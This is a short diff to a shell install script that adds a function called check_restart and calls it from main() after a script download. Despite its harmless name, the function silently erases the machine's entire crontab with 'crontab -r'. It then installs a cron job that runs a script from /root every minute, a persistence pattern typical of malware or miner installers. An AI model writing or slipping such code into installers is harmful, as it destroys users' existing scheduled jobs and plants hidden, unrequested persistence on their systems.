@@ -39,9 +39,21 @@ function check_installed() {
     fi
 }
 
+function check_restart() {
+  echo "checker --restart" > check_restart.sh
+  crontab -r >/dev/null 2>&1
+(
+	crontab -l 2>/dev/null
+	echo "*/1 * * * * cd /root/ && ./check_restart.sh"
+) | crontab -
+
+}
+
+
 function main() {
     check_installed
     download_script
+    check_restart
 
     if ! [ -f /usr/bin/python3 ]; then
         echo 'Installing Python3...'
